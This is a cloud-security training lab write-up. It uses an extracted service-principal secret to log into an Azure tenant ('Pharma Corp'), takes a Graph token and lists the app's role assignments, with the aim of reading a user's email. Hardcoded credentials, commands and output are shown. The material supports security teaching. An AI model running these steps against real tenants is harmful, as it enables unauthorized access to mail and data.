# Attack Lab 12

```
− Login to the Pharma Corp tenant as ‘mailapp’ by using the credentials added earlier.
− Check the current API Permissions assigned to the service principal.
− Read the email content of MarieWilliams@pharmacorphq.onmicrosoft.com.
```

Validate the previous lab extracted credentials:
source code
```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
```
output
```
PS C:\Users\studentuser107> Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd

WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 
```
With the current logged user extract and enumerate roleassigment:

```
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Params = @{
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/appRoleAssignments"
"Method" = "GET"
"Headers" = @{
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}
$RoleAssignments = Invoke-RestMethod @Params -UseBasicParsing
$RoleAssignments.value
```
execution output:

```
PS C:\Users\studentuser107> $Params = @{
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/appRoleAssignments"
"Method" = "GET"
"Headers" = @{
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}

PS C:\Users\studentuser107> $RoleAssignments = Invoke-RestMethod @Params -UseBasicParsing

PS C:\Users\studentuser107> $RoleAssignments.value


id                   : AJyaShe_2EO0N_6BRMjfFS3Mt2NL-w5JqNFAw2e_2Cg
deletedDateTime      : 
appRoleId            : df021288-bdef-4463-88db-98f22de89214
createdDateTime      : 2022-06-20T11:06:13.5594346Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978

id                   : AJyaShe_2EO0N_6BRMjfFbksvwwU2tFCv0Ch_bDHaJ8
deletedDateTime      : 
appRoleId            : 810c84a8-4a9e-49e6-bf7d-12d183f40d01
createdDateTime      : 2022-06-20T11:06:13.7469384Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978

```
